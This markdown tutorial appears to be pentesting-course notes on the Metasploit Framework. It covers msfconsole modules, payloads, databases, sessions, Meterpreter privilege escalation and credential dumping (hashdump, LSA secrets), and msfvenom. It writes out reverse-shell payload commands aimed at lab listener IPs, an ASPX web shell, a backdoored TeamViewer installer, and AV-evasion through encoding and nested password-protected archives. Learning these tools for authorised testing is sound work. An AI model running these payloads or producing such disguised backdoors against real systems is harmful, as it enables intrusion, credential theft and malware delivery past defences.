# Using the Metasploit Framework

1. [Introduction to Metasploit](#introduction-to-metasploit)
1. [Modules](#modules)
1. [Targets](#targets)
1. [Payloads](#payloads)
1. [Encoders](#encoders)
1. [Databases](#databases)
1. [Plugins & Mixins](#plugins--mixins)
1. [Sessions](#sessions)
1. [Meterpreter](#meterpreter)
1. [Writing and Importing Modules](#writing-and-importing-modules)
1. [Introduction to MSFVenom](#introduction-to-msfvenom)
1. [Firewall and IDS/IPS Evasion](#firewall-and-idsips-evasion)

## Introduction to Metasploit

* ```Metasploit Project``` - Ruby-based modular pentesting platform for exploit development (includes Metasploit Pro - commercial version).

* ```Metasploit Framework``` - includes tools to test vulnerabilities, enumerate & exploit; includes modules of actual exploits & can be accessed by ```msfconsole```.

* ```msfconsole``` architecture includes modules, plugins, scripts and tools.

* MSF engagement structure:

  * Enumeration
  * Preparation
  * Exploitation
  * Privilege Escalation
  * Post-Exploitation

## Modules

* Modules are prepared scripts with specific purpose and function for exploits.

* Syntax - ```<index no.> <type>/<os>/<service>/<name>```

* We can search for modules in ```msfconsole``` using specific tags - run ```help search``` for more info.

  ```shell
  msfconsole

  search eternalromance

  search eternalromance type:exploit
  # more specific

  use 0
  # from matching modules, use the one with index 0

  options
  # we need to set required options

  info
  # shows module info

  set RHOSTS 10.10.10.40

  options
  # now the value has changed

  # we can use setg - setting global value of option
  
  # set other options before running module

  run
  # exploit
  # this gives us a meterpreter shell

  shell
  # launches shell
  ```

## Targets

* Targets - unique OS identifiers, matching specific OS versions for exploits.

  ```shell
  # in msfconsole
  # if we have selected module already

  options
  # shows module options

  show targets
  # exploit targets list
  
  set target 5
  # sets target with index 5
  # if unset, metasploit will choose automatically

  info
  # this also includes targets
  ```

## Payloads

* Payloads - modules that aid exploit module in returning a shell to attacker.

* Types of payload modules in MSF:

  * Singles - contains exploit & entire shellcode for selected task; self-contained, but large (no ```/``` in payload name)

  * Stagers - work with Stage payloads to perform specific task; Stager waits on attacker machine, ready to establish connection to victim once stage is run; smaller, more reliable

  * Stages - payload components downloaded by Stagers

* Staged payloads:

  * Modularized exploitation process
  * For AV/IPS evasion
  * Stage0 - initial shellcode sent over network to victim; to initialize connection back to attacker (reverse connection)
  * After stable communication established, attacker will send bigger payload stages for shell access (Stage1)
  * Meterpreter payload - specific payload that uses DLL injection; offers inbuilt commands

  ```shell
  # in msfconsole

  show payloads
  # lists all payloads
  # if exploit module selected, lesser payloads will be shown

  # search for payloads
  grep meterpreter show payloads
  
  grep meterpreter grep reverse_tcp show payloads

  set payload 2
  # based on index, it selects payload

  show options
  # view parameters for payload

  ifconfig
  # view LHOST IP address

  set LHOST 10.10.14.15
  set RHOSTS 10.10.10.40

  run
  # gives meterpreter shell

  help
  # shows all commands in meterpreter shell

  shell
  # creates channel and gives command prompt
  ```

## Encoders

* Encoders are used to make payloads compatible with different processor architectures (x64, x86, sparc, ppc & mips), and used for AV evasion too; they are also used to remove hexadecimal opcodes (aka bad characters) from payload.

* SGN (Shikata Ga Nai) is one of the more popular encoding schemes.

  ```shell
  # generating payload without encoding
  msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

  # generating payload with encoding
  msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

  # generating payload with multiple iterations of same encoding scheme
  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

  # we can use msf-virustotal to analyze payloads
  ```

  ```shell
  # in msfconsole

  set payload 15
  # if we want to select encoder for existing payload
  show encoders
  ```

## Databases

* Databases are used to keep track of results and exploit module parameters.

  ```shell
  # check if postgresql is up for msfdb to work
  sudo service postgresql status

  # start service
  sudo systemctl start postgresql

  # initiate db
  sudo msfdb init

  # if this gives an error, update metasploit
  # and initiate db again

  # check status
  sudo msfdb status

  # run msfdb
  sudo msfdb run
  # starts msfconsole

  help database
  # shows all database options

  db_status
  # shows current status of db

  # workspaces can be used to segregate projects or scans
  workspace
  # shows available workspace list

  workspace -a Target_1
  # adds a new workspace

  workspace Target_1
  # now we can use this workspace

  workspace
  # shows list along with asterisk for currently used one

  workspace -h
  # help options

  # we can import scan results in workspace
  # like nmap scans, preferred in xml format

  db_import Target.xml

  # auto-filled by import
  hosts

  services
  # the hosts and services can be customized as well

  # alternatively, we can use nmap from msfconsole

  db_nmap -sV -sS 10.10.10.8

  hosts

  services

  # to backup our data
  db_export -f xml backup.xml

  creds -h
  # shows creds gathered while interacting with target

  loot -h
  # shows owned services and users
  # and hash dumps
  ```

## Plugins & Mixins

* Plugins are 3rd party software integrated inside MSF.

  ```shell
  ls /usr/share/metasploit-framework/plugins
  # lists all available plugins

  msfconsole

  load nessus
  # load any plugin

  nessus_help

  # we can install new plugins as well
  # if we have a .rb file, we can just copy it to plugins folder
  # and relaunch msfconsole to check
  ```

* Mixins (feature of Ruby language) - classes that act as methods for use by other classes, without having to be the parent class.

## Sessions

* We can run several modules using sessions - these can be switched between and backgrounded or turned into jobs.

  ```shell
  sessions
  # lists active sessions

  # we can background the session
  # using Ctrl+Z or 'background' command in Meterpreter shell

  # to interact with a session based on index
  session -i 1

  # if we are running an exploit under a port
  # and we need the port for another module
  # then we cannot terminate using Ctrl+C
  # we would need to use jobs

  jobs -h
  # help for jobs

  # we can run an exploit as a background job
  exploit -j

  jobs -l
  # list running jobs
  ```

## Meterpreter

* Meterpreter payload - specific, multi-faceted, extensible payload - uses DLL injection and resides in memory of victim, leaving no traces on hard drive.

* When Meterpreter payload is sent & run on target, we get a Meterpreter shell.

  ```shell
  # inside meterpreter shell
  help
  # get list of all commands

  getuid
  # get user details
  
  # migrate process to user with more privilege
  ps
  # process list

  steal_token 1836
  # where 1836 is PID of process with privileged user

  getuid
  # privileged user

  # we can try for more privesc

  bg
  # background the session

  # back in normal msfconsole
  search local_exploit_suggester

  use 0

  show options

  set SESSION 1

  run
  # this recon module shows multiple options
  # we can try the exploits suggested

  use exploit/windows/local/ms15_051_client_copy_images

  show options

  set session 1

  set LHOST tun0

  run
  # we get meterpreter shell

  getuid
  # privesc

  hashdump
  # dump hashes

  lsa_dump_sam

  lsa_dump_secrets
  ```

## Writing and Importing Modules

* We can install custom exploits in Metasploit - ExploitDB offers exploits ready for MSF (we can use MSF tag to search).

  ```shell
  msfconsole

  search nagios
  # exploit not installed locally

  # in another tab
  searchsploit nagios3

  searchsploit -t Nagios3 --exclude=".py"
  # we need to get .rb file

  # download the .rb file
  # and paste it in the correct directory
  cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

  msfconsole -m /usr/share/metasploit-framework/modules

  # back in msfconsole

  reload_all
  # reload all modules

  # now we can use the newly loaded exploit
  ```

## Introduction to MSFVenom

* MSFVenom is used to craft payloads for different target host architectures.

  ```shell
  nmap -sV -T4 -p- 10.10.10.5

  ftp 10.10.10.5
  # anon ftp access
  # it has aspnet_client

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
  # generates aspx payload
  # which can be uploaded
  # listener will get reverse shell if payload is triggered on web service

  msfconsole -q

  use multi/handler

  set LHOST 10.10.14.5
  set LPORT 1337

  run
  # trigger payload to get reverse shell
  # we can use local_exploit_suggester
  ```

## Firewall and IDS/IPS Evasion

* Endpoint protection - any local device/service with sole purpose of protecting single host on network; usually comes in form of software packs for AV.

* Perimeter protection - physical/virtual devices on network perimeter edge; provides network access from public (outside) to private (inside).

* Security policies - similar to ACLs; allow/deny statements for network traffic.

* Multiple methods can be used to match an event with a security policy entry, such as signature-based detection, heuristic detection, stateful protocol analysis detection, and live-monitoring & alerting (SOC-based).

* Evasion techniques:

  * Simply encoding payloads using different schemes with iterations is not enough

  * Network-based IDS/IPS can be taken care of as ```msfconsole``` can tunnel AES-encrypted communication

  * We can use executable templates to obfuscate our payload, creating a backdoored executable:

    ```shell
    msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
    ```
  
  * Archives can be used as well to attempt to bypass AV signatures:

    ```shell
    msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

    # we can use the rar utility for archiving
    wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz

    tar -xzvf rarlinux-64-612.tar.gz && cd rar

    rar a ~/test.rar -p ~/rest.js

    # remove rar extension
    mv test.rar test

    # archive payload again
    rar a test2.tar -p test

    mv test2.rar test2
    # final payload
    ```
  
  * Packers can be used as well - payload is packed together with an executable program and decompression code in a single file
